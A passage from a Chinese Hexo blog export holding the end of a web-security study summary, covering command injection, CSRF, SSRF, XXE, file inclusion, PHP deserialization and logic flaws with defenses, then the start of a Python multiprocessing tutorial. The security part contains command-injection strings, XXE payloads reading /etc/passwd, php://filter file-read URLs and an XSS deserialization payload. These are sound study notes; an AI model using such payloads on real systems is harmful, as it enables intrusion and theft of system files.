<p>  命令执行：system(), shell_exec(), exec(), passthru(), pcntl_exec(), popen(), 反引号</p>
<p>  代码执行：eval(), assert(), 动态函数调用, preg_replace()</p>
</blockquote>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>payload：</p>
<p>windows：</p>
<p>|     直接执行后面的语句      ping 127.0.0.1|whoami    </p>
<p>||    前面出错执行后面的 ，前面为假       ping  2 || whoami </p>
<p>&amp;   前面的语句为假则直接执行后面的,前面可真可假                       ping 127.0.0.1&amp;whoami</p>
<p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真    ping 127.0.0.1&amp;&amp;whoami</p>
<p>Linux：</p>
<p>;     前面的执行完执行后面的      ping 127.0.0.1;whoami  </p>
<p>|     管道符，显示后面的执行结果   ping 127.0.0.1|whoami   </p>
<p>||    前面出错执行后面的 ，前面为假       ping  2 || whoami </p>
<p>&amp;   前面的语句为假则直接执行后面的,前面可真可假                       ping 127.0.0.1&amp;whoami</p>
<p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真    ping 127.0.0.1&amp;&amp;whoami</p>
<h2 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h2><ul>
<li><p>禁用高危系统函数</p>
</li>
<li><p>严格过滤关键字符</p>
</li>
<li><p>严格限制允许的参数类型</p>
</li>
</ul>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h2><p>跨站请求伪造简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求，然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。</p>
<p>CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</p>
<p>网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：</p>
<ul>
<li>对敏感信息的操作增加安全的token；</li>
<li>对敏感信息的操作增加安全的验证码；</li>
<li>对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</li>
</ul>
<h2 id="token"><a href="#token" class="headerlink" title="token"></a>token</h2><p>Token一般用在两个地方: <code>防止表单重复提交</code>，<code>防止csrf攻击</code></p>
<p>两者在原理上都是通过session token来实现的。当客户端请求页面时，服务器会生成一个随机数Token，并且</p>
<p>将Token放置到session当中，然后将Token发给客户端（一般通过构造hidden表单）。</p>
<p>下次客户端提交请求时，Token会随着表单一起提交到服务器端。</p>
<p>服务器端第一次验证相同过后，会将session中的Token值更新下，若用户重复提交，第二次的验证判断将失败，因为用户提交的表单中的Token没变，但服务器端session中Token已经改变了。</p>
<p>token验证：</p>
<ul>
<li>token须要足够随机</li>
<li>敏感的操作应该使用POST。而不是GET，以form表单的形式提交。能够避免token泄露。</li>
</ul>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="概述-4"><a href="#概述-4" class="headerlink" title="概述"></a>概述</h2><p>服务器端请求伪造</p>
<p>由于有的web应用需要实现从其它服务器上获取资源的功能，但是没有对url进行限制，导致可以构造非本意的url对内网或者其它服务器发起恶意请求。</p>
<p>通过ssrf漏洞可以对内网或本地机器进行主机发现，服务版本探测或者针对内网或本地一些薄弱的应用进行攻击，同时利用ssrf漏洞还可以使服务器主动发起请求，从而做为一个攻击跳板或者绕过CDN找到其服务器的真实ip</p>
<p><code>file_get_contents()，fsockopen()，curl_exec()</code>三个函数使用不当时将会造成ssrf</p>
<h2 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h2><ul>
<li>限制协议</li>
<li>限制IP</li>
<li>过滤返回信息</li>
<li>统一错误信息</li>
</ul>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XML外部实体注入</p>
<h2 id="概述-5"><a href="#概述-5" class="headerlink" title="概述"></a>概述</h2><p>XML：可扩展标记语言，常用于 数据存储，数据传输，数据共享</p>
<p>XML实体：</p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587106820702.png" alt="1587106820702"></p>
<p>DTD：文档类型定义，一种XML约束模式语言，用于描述XML文档的结构，每个XML文件可携带一个自身格式的描述，不同组织的人可使用一个通用DTD来交换数据，应用程序可以使用一个标准DTD校验从外部接受的XML数据是否有效</p>
<p>DTD的三种形式：</p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587106864195.png" alt="1587106864195"></p>
<h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>普通实体引入外部实体：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">poem</span>[</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">poem</span>&gt;</span></span><br><span class="line">    <span class="symbol">&amp;xxe;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">poem</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>参数实体引入外部实体：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">poem</span>[</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://www.test.com/outdtd.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">% a;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">poem</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">poem</span>&gt;</span></span><br><span class="line"></span><br><span class="line">outdtd.dtd</span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>危害：任意文件读取，恶意url请求，递归调用占用服务器资源</p>
<p>相关：webService，Xfire，XfireXXE</p>
<h2 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h2><ul>
<li>禁用外部实体</li>
<li>过滤和验证用户提交的XML数据</li>
<li>不允许XML中含有自己生命的DTD</li>
<li>配置XML parse 只能使用静态DTD，禁止外来引入</li>
</ul>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="概述-6"><a href="#概述-6" class="headerlink" title="概述"></a>概述</h2><p>用户的一些行为会将服务器某些文件比如日志，session等写入信息，如果有php页面能够把写入的恶意代码其包含进来，就可能getshell</p>
<p>include， include_once，require，require_one引入文件时，利用参数拼接成路径，而参数如果可控则造成问题。</p>
<p>本地包含：只要使用了include，require等包含的函数，就能本地包含</p>
<p>远程包含：远程包含是跨地址的包含，即包含另外台服务器的页面，前提是在php.ini里面的allow_url_include=ON和allow_url_fopen=ON</p>
<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><ul>
<li>php://input</li>
</ul>
<blockquote>
<p>   读取到访问请求的原始数据的只读流，即读取POST上没有经过解析的数据。不支持multipart/form-data的类型的传码方式上传。在配置文件php.ini中allow_url_include =&gt; On 打开</p>
<p>  <img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587111630091.png" alt="1587111630091"></p>
</blockquote>
<ul>
<li>php://filter</li>
</ul>
<blockquote>
<p>  对磁盘中的文件进行读写,因此可以通过该协议来达到对文件的读取</p>
<p>  resource= 要过滤的数据流<br>  read = 读链的筛选列表<br>  write = 写链的筛选列表<br>  convert.base64-encode =&gt;打开后是base64编码后的</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;include.php?a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;fupload.php　　　　#读取文件，将内容base64编码输出</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li>zip://</li>
</ul>
<blockquote>
<p>  将压缩包里面的文件读取出来，并包含读取的文件，文件路径必须为绝对路径</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;include.php?a&#x3D;zip:&#x2F;&#x2F;D:&#x2F;phpstudy&#x2F;WWW&#x2F;test&#x2F;hello.zip%23hello.txt　　　　&#x2F;&#x2F; %23是#编码，因为要会和url中#定为冲突</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li>phar://</li>
</ul>
<blockquote>
<p>  将压缩包里面的文件读取出来，并包含读取的文件，文件路径可用是相对路径</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;include.php?a&#x3D;phar:&#x2F;&#x2F;hello.zip&#x2F;hello.txt</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li>file_put_contents()</li>
</ul>
<blockquote>
<p>  在file_put_contents()中可以用php://filter协议进行写文件</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_put_contents(&#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-encode&#x2F;resource&#x3D;hello.php&#x2F;.&#39;, &#39;PD9waHAgZWNobyAiaGVsbG8iOz8+&#39;);　　　　　　　　#可以将base64解码内容写进去，并且不会保存&#x2F;.</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="常见包含"><a href="#常见包含" class="headerlink" title="常见包含"></a>常见包含</h3><ul>
<li><p>对session的包含</p>
</li>
<li><p>对日志文件进行包含</p>
</li>
<li><p>包含图片</p>
</li>
<li><p>包含临时文件</p>
</li>
</ul>
<h3 id="常见配置文件"><a href="#常见配置文件" class="headerlink" title="常见配置文件"></a>常见配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;default.conf</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;000-default.conf　　　　#可以看到web的目录路径</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;php.conf</span><br></pre></td></tr></table></figure>

<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><h3 id="概述-7"><a href="#概述-7" class="headerlink" title="概述"></a>概述</h3><h4 id="序列化serialize"><a href="#序列化serialize" class="headerlink" title="序列化serialize()"></a>序列化serialize()</h4><p>序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test=<span class="string">"pikachu"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$s=<span class="keyword">new</span> S(); <span class="comment">//创建一个对象</span></span><br><span class="line">serialize($s); <span class="comment">//把这个对象进行序列化</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">序列化后得到的结果是这个样子的:O:1:"S":1:&#123;s:4:"test";s:7:"pikachu";&#125;</span><br><span class="line">    O:代表object</span><br><span class="line">    1:代表对象名字长度为一个字符</span><br><span class="line">    S:对象的名称</span><br><span class="line">    1:代表对象里面有一个变量</span><br><span class="line">    s:数据类型</span><br><span class="line">    4:变量名称的长度</span><br><span class="line">    test:变量名称</span><br><span class="line">    s:数据类型</span><br><span class="line">    7:变量值的长度</span><br><span class="line">    pikachu:变量值</span><br></pre></td></tr></table></figure>

<h4 id="反序列化unserialize"><a href="#反序列化unserialize" class="headerlink" title="反序列化unserialize()"></a>反序列化unserialize()</h4><p>就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$u=unserialize(<span class="string">"O:1:"</span>S<span class="string">":1:&#123;s:4:"</span>test<span class="string">";s:7:"</span>pikachu<span class="string">";&#125;"</span>);</span><br><span class="line"><span class="keyword">echo</span> $u-&gt;test; <span class="comment">//得到的结果为pikachu</span></span><br></pre></td></tr></table></figure>

<h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p>
<p>常见的几个魔法函数:<br>__construct()当一个对象创建时被调用</p>
<p>__destruct()当一个对象销毁时被调用</p>
<p>__toString()当一个对象被当作一个字符串使用</p>
<p>__sleep() 在对象在被序列化之前运行</p>
<p>__wakeup将在序列化之后立即被调用</p>
<h4 id="漏洞举例"><a href="#漏洞举例" class="headerlink" title="漏洞举例"></a>漏洞举例</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">"pikachu"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$s = $_GET[<span class="string">'test'</span>];</span><br><span class="line">@$unser = unserialize($a);</span><br></pre></td></tr></table></figure>

<p>payload:<code>O:1:&quot;S&quot;:1:{s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;}</code></p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">"pikachu"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$html=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'o'</span>]))&#123;	</span><br><span class="line">    $s = $_POST[<span class="string">'o'</span>];		<span class="comment">//获取参数o</span></span><br><span class="line">    <span class="keyword">if</span>(!@$unser = unserialize($s))&#123;	<span class="comment">//反序列化</span></span><br><span class="line">        $html.=<span class="string">"&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $html.=<span class="string">"&lt;p&gt;&#123;$unser-&gt;test&#125;&lt;/p&gt;"</span>;	<span class="comment">//直接输出</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>构造语句：<code>O:1:&quot;S&quot;:1:{s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;}</code></p>
<h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><p><a href="https://www.cnblogs.com/xishaonian/p/7628153.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/7628153.html</a></p>
<h1 id="SSTL"><a href="#SSTL" class="headerlink" title="SSTL"></a>SSTL</h1><p><a href="https://blog.csdn.net/Fly_hps/article/details/86608395" target="_blank" rel="noopener">https://blog.csdn.net/Fly_hps/article/details/86608395</a></p>
<h1 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h1><p><a href="https://blog.csdn.net/xixingzhe2/article/details/103154456" target="_blank" rel="noopener">https://blog.csdn.net/xixingzhe2/article/details/103154456</a></p>
<h1 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h1><h2 id="概述-8"><a href="#概述-8" class="headerlink" title="概述"></a>概述</h2><p>许多的Web应用程序一般会有对服务器的文件读取查看的功能，大多会用到提交的参数来指明文件名<br>形如：<code>http://www.nuanyue.com/getfile=image.jgp</code></p>
<p>当服务器处理传送过来的image.jpg文件名后，Web应用程序即会自动添加完整路径，形如<code>d://site/images/image.jpg</code>，将读取的内容返回给访问者。</p>
<p>初看，在只是文件交互的一种简单的过程，但是由于文件名可以任意更改而服务器支持<code>~/</code>，<code>../</code>等特殊符号的目录回溯，从而使攻击者越权访问或者覆盖敏感数据，如网站的配置文件、系统的核心文件，这样的缺陷被命名为路径遍历漏洞。</p>
<p>路径遍历漏洞的发现，主要是对Web应用程序的文件读取交互的功能块，进行检测，面对这样的读取方式：<br><code>http://www.nuanyue.com/test/downfile.jsp?filename=fan.pdf</code>我们可以使用 <code>../</code>来作试探，</p>
<p>路径遍历漏洞隐藏一般在文件读取或者展示图片功能块这样的通过参数提交上来的文件名</p>
<h2 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h2><ul>
<li>编码加密</li>
<li>空字节截断，<code>%00</code>等</li>
</ul>
<blockquote>
<p>  一些Web应用程序在读取文件前，会对提交的文件后缀进行检测，攻击者可以在文件名后放一个空字节的编码，来绕过这样的文件类型的检查。</p>
</blockquote>
<ul>
<li>修改<code>Http Referer</code></li>
</ul>
<blockquote>
<p>  在一些Web应用程序中，会有对提交参数的来路进行判断的方法，而绕过的方法可以尝试通过在网站留言或者交互的地方提交Url再点击或者直接修改Http<br>  Referer即可，这主要是原因Http Referer是由客户端浏览器发送的，服务器是无法控制的，而将此变量当作一个值得信任源是错误的。</p>
</blockquote>
<h2 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h2><ol>
<li>数据净化，对网站用户提交过来的文件名进行硬编码或者统一编码，对文件后缀进行白名单控制，对包含了恶意的符号或者空字节进行拒绝。</li>
<li>Web应用程序可以使用chrooted环境访问包含被访问文件的目录，或者使用绝对路径+参数来控制访问目录，使其即使是越权或者跨越目录也是在指定的目录下。</li>
</ol>
<h1 id="任意文件下载漏洞"><a href="#任意文件下载漏洞" class="headerlink" title="任意文件下载漏洞"></a>任意文件下载漏洞</h1><p><a href="https://www.cnblogs.com/zhaijiahui/p/8459661.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/8459661.html</a></p>
<p><a href="https://bealright.github.io/2019/10/24/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://bealright.github.io/2019/10/24/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/</a></p>
<h2 id="不安全的URL跳转"><a href="#不安全的URL跳转" class="headerlink" title="不安全的URL跳转"></a>不安全的URL跳转</h2><p><a href="https://blog.csdn.net/weixin_43915842/article/details/91352027" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43915842/article/details/91352027</a></p>
<h1 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h1><h2 id="重复注册"><a href="#重复注册" class="headerlink" title="重复注册"></a>重复注册</h2><p>在未经验证的或验证可绕过的情况下，可再次注册已注册用户，覆盖之前的用户密码</p>
<h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>原理：开发人员在对数据进行增删改查时对请求的身份未做验证，鉴权等逻辑判断</p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587192129297.png" alt="1587192129297"></p>
<p>水平越权：获取同级别其他用户的权限</p>
<p>垂直越权：获得添加管理员用户或其他管理员权限</p>
<p>常见测试方法：修改请求数据包</p>
<h2 id="支付逻辑漏洞"><a href="#支付逻辑漏洞" class="headerlink" title="支付逻辑漏洞"></a>支付逻辑漏洞</h2><p>原理：支付流程通常为<code>选择商品和数量-选择支付及配送方式-生成订单-完成支付</code>，在这个过程中出现逻辑判断错误便会产生漏洞。</p>
<p>常见的支付逻辑漏洞：</p>
<ul>
<li>支付过程中可修改支付金额</li>
<li>可以将订单中的数量改为负值</li>
<li>请求重放</li>
<li>其他问题如程序异常，参数修改导致的问题等</li>
</ul>
<p>修复：</p>
<ul>
<li>对数据中涉及金额，数量等敏感信息进行加密</li>
<li>支付交易请求数据中加入token</li>
</ul>
<h2 id="密码找回"><a href="#密码找回" class="headerlink" title="密码找回"></a>密码找回</h2><h2 id="用户凭证客户端回显"><a href="#用户凭证客户端回显" class="headerlink" title="用户凭证客户端回显"></a>用户凭证客户端回显</h2><p>原理：</p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587192640106.png" alt="1587192640106"></p>
<p>常见回显：数据包回显，url回显，加密字符串回显，网页源代码回显等</p>
<p>常见用户凭证：密保问题，邮箱/手机验证码</p>
<h2 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h2><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>原理：当这些验证码具有一定规律性，且没有做好相应的防护措施时，会导致攻击者通过穷举或其他方式猜解出验证码。</p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587192823213.png" alt="1587192823213"></p>
<p>防御：</p>
<ul>
<li>提高密码复杂度</li>
<li>限制错误次数</li>
<li>限制验证码的时效性</li>
</ul>
<h3 id="客户端回显"><a href="#客户端回显" class="headerlink" title="客户端回显"></a>客户端回显</h3><p>原理：验证码客户端回显或可截取</p>
<h3 id="自动识别"><a href="#自动识别" class="headerlink" title="自动识别"></a>自动识别</h3><p>原理：</p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587193253169.png" alt="1587193253169"></p>
<p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587193264832.png" alt="1587193264832"></p>
<p>工具：</p>
<p>Pkav http fuzzer</p>
<p>防御：</p>
<ul>
<li>增加背景色干扰</li>
<li>字符扭曲粘连</li>
<li>使用公式等逻辑验证</li>
<li>图形验证码和使用者相关</li>
<li>限制失败次数</li>
</ul>
<h3 id="重复使用"><a href="#重复使用" class="headerlink" title="重复使用"></a>重复使用</h3><p><img src="/2020/04/17/web%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/1587192714075.png" alt="1587192714075"></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>python进阶</title>
    <url>/2020/04/19/python%E8%BF%9B%E9%98%B6/</url>
    <content><![CDATA[<h1 id="多任务"><a href="#多任务" class="headerlink" title="多任务"></a>多任务</h1><h2 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h2><h3 id="multiprocessing"><a href="#multiprocessing" class="headerlink" title="multiprocessing"></a>multiprocessing</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">"1-----"</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">"2------"</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    p1 = multiprocessing.Process(target=test1)</span><br><span class="line">    p2 = multiprocessing.Process(target=test2)</span><br><span class="line">    p1.start()</span><br><span class="line">    p2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h3><ul>
<li>队列</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">q = multiprocessing.Queue(<span class="number">3</span>)</span><br><span class="line">q.put(<span class="string">"111"</span>)</span><br><span class="line">q.put(<span class="number">222</span>)  <span class="comment">#放入队列</span></span><br><span class="line">q.put([<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>])</span><br><span class="line">q.get()     <span class="comment">#获取队列</span></span><br><span class="line">q.get()</span><br><span class="line">q.get_nowait()  <span class="comment">#不等待的获取</span></span><br><span class="line">q.full()    <span class="comment">#判断为满</span></span><br><span class="line">q.empty()   <span class="comment">#判断为空</span></span><br></pre></td></tr></table></figure>

<ul>
<li>使用队列实现进程通信</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_from_web</span><span class="params">(q)</span>:</span></span><br><span class="line">    data = [<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> temp <span class="keyword">in</span> data:</span><br><span class="line">        q.put(temp)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"下载完毕"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysis_data</span><span class="params">(q)</span>:</span></span><br><span class="line">    waitting_analysis_data = list()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = q.get()</span><br><span class="line">        waitting_analysis_data.append(data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> q.empty():</span><br><span class="line">            <span class="keyword">break</span>    </span><br><span class="line"></span><br><span class="line">    print(waitting_analysis_data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    q = multiprocessing.Queue() <span class="comment">#创建队列</span></span><br><span class="line"></span><br><span class="line">    p1 = multiprocessing.Process(target=download_from_web, args=(q,))   <span class="comment">#创建进程，target要调用的函数，args传递的参数</span></span><br><span class="line">    p2 = multiprocessing.Process(target=analysis_data, args=(q,))</span><br><span class="line">    p1.start()  <span class="comment">#开始执行子进程</span></span><br><span class="line">    p2.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="进程池"><a href="#进程池" class="headerlink" title="进程池"></a>进程池</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os, time, random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">worker</span><span class="params">(msg)</span>:</span></span><br><span class="line"></span><br><span class="line">    t_start = time.time()</span><br><span class="line">    print(<span class="string">"%s开始执行，进程号为%d"</span> % (msg, os.getpid()))</span><br><span class="line">    time.sleep(random.random()*<span class="number">2</span>)</span><br><span class="line">    t_stop = time.time()</span><br><span class="line">    print(msg, <span class="string">"执行完毕，耗时%0.2f"</span> % (t_stop - t_start))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">po = multiprocessing.Pool(<span class="number">3</span>)    <span class="comment">#定义进程池</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">    po.apply_async(worker, (i,))    <span class="comment">#要调用的目标，传递参数元组</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"__start__"</span>)</span><br><span class="line">po.close()  <span class="comment">#关闭进程池，关闭后不在接收请求</span></span><br><span class="line">po.join()   <span class="comment">#等待po中的所有子进程执行完成，必须放在close语句后</span></span><br><span class="line">print(<span class="string">"__end__"</span>)</span><br></pre></td></tr></table></figure>

